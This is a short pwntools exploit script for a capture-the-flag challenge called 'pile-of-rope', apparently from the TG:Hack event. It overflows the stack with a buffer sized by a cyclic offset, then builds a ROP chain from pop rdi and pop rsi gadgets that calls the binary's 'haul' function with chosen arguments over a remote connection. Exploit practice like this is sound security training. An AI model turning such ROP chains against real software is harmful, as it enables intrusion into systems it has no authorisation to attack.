#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pile-of-rope
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pile-of-rope')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = remote("pileofrope.tghack.no", 1337)

X = p64(exe.symbols["haul"])

RDI = p64(0xDEADBEEF)
RSI = p64(0x52305045)
R15 = p64(0x00000000)

# $ ROPgadget --binary pile-of-rope | grep 'pop rdi'
# 0x00000000004012bb : pop rdi ; ret
POP_RDI = p64(0x4012bb)

# $Â ROPgadget --binary pile-of-rope | grep 'pop rsi'
# 0x00000000004012b9 : pop rsi ; pop r15 ; ret
POP_RSI_R15 = p64(0x4012b9)

PAYLOAD  = b'A' * cyclic_find(b'jaaaaaaa', n=8)
PAYLOAD += POP_RDI + RDI + POP_RSI_R15 + RSI + R15 + X
io.sendlineafter(">", PAYLOAD)

io.interactive()
